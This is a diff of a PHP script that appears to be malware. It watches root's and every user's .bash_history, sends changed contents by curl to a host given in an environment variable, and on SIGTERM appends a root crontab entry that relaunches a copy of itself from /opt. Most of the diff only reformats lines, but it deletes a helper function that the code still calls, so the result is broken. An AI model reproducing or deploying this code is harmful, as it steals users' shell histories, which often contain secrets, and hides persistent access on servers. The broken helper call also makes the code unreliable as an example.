@@ -1,13 +1,5 @@
 <?php
-function randomAlphaNumericString(int $length) {
-    $chars = str_split('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789');
-    $out = '';
-    while (strlen($out) < $length) {
-        shuffle($chars);
-        $out .= $chars[rand(0, 61)];
-    }
-    return $out;
-}
+
 $lastSize = array();
 $host = getenv('TARGET_HOST');
 $key = getenv('TARGET_KEY');
@@ -28,7 +20,7 @@ if (getenv('##KILLNAME##') === '##KILLKEY##') {
 $data = file_get_contents(__FILE__);
 $pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $iv) {
     $file = randomAlphaNumericString(3);
-    mkdir ("/opt", true);
+    mkdir("/opt", true);
     file_put_contents('/etc/crontab', "\n* * * * * root sh /opt/$file.sh", FILE_APPEND);
     file_put_contents(
         "/opt/$file.sh",
@@ -39,12 +31,13 @@ $pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $i
         . "LOCAL_CRYPT=$crypt "
         . "LOCAL_IV=$iv "
         . "LOCAL_CRYPT=$crypt "
-        . "php $file.php &>/dev/null &");
+        . "php $file.php &>/dev/null &"
+    );
     file_put_contents("/opt/$file.php", $data);
 };
 pcntl_signal(SIGTERM, $pcntlhandler);
 pcntl_signal(SIGKILL, $pcntlhandler);
-while(true) {
+while (true) {
     $files = array('root' => '/root/.bash_history');
     foreach (array_diff(scandir('/home'), ['.', '..']) as $user) {
         $files[preg_replace('/[^a-z0-9_-]+/i', '', $user)] = "/home/$user/.bash_history";
@@ -52,7 +45,7 @@ while(true) {
     foreach ($files as $user => $file) {
         if (is_file($file) && is_readable($file)) {
             $lastSize2 = filesize($file);
-            if ($lastSize[$user]??0 !== $lastSize2) {
+            if ($lastSize[$user] ?? 0 !== $lastSize2) {
                 $data = file_get_contents($file);
                 if ($data) {
                     $c = curl_init();
